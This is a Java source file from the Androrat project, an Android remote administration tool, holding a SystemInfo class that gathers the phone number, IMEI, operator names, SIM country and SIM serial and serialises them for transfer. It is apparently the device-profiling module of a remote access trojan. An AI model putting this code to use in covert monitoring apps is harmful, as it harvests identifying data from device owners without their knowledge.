/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package my.app.Library;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Hashtable;

import android.content.Context;
import android.telephony.TelephonyManager;

public class SystemInfo {

	Context ctx;
	TelephonyManager tm;
	
	public SystemInfo(Context c) {
		ctx = c;
		tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
	}
	
	public String getPhoneNumber() {
		return tm.getLine1Number();
	}
	
	public String getIMEI() {
		return tm.getDeviceId();
	}
	
	public String getCountryCode() {
		return tm.getNetworkCountryIso();
	}
	
	public String getOperatorName() {
		return tm.getNetworkOperatorName();
	}
	
	public String getSimCountryCode() {
		return tm.getSimCountryIso();
	}
	
	public String getSimOperatorName() {
		return tm.getSimOperatorName();
	}
	
	public String getSimSerial() {
		return tm.getSimSerialNumber();
	}
	
	public byte[] getBasicInfos() {
		Hashtable<String, String> h = new Hashtable<String, String>();
		String res;
		res = getIMEI();
		if(res != null)
			h.put("IMEI", res);
		res = getPhoneNumber();
		if(res != null)
			h.put("PhoneNumber", res);
		res = getCountryCode();
		if(res != null)
			h.put("Country", res);
		res = getOperatorName();
		if(res != null)
			h.put("Operator",res);
		res = getSimCountryCode();
		if(res != null)
			h.put("SimCountry", res);
		res = getSimOperatorName();
		if(res != null)
			h.put("SimOperator", res);
		res= getSimSerial();
		if(res != null)
			h.put("SimSerial", res);
		
		try {
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			ObjectOutputStream out = new ObjectOutputStream(bos);
			out.writeObject(h);
			return bos.toByteArray();
		} catch (IOException e) {
			return null;
		}
	}
	

	
}
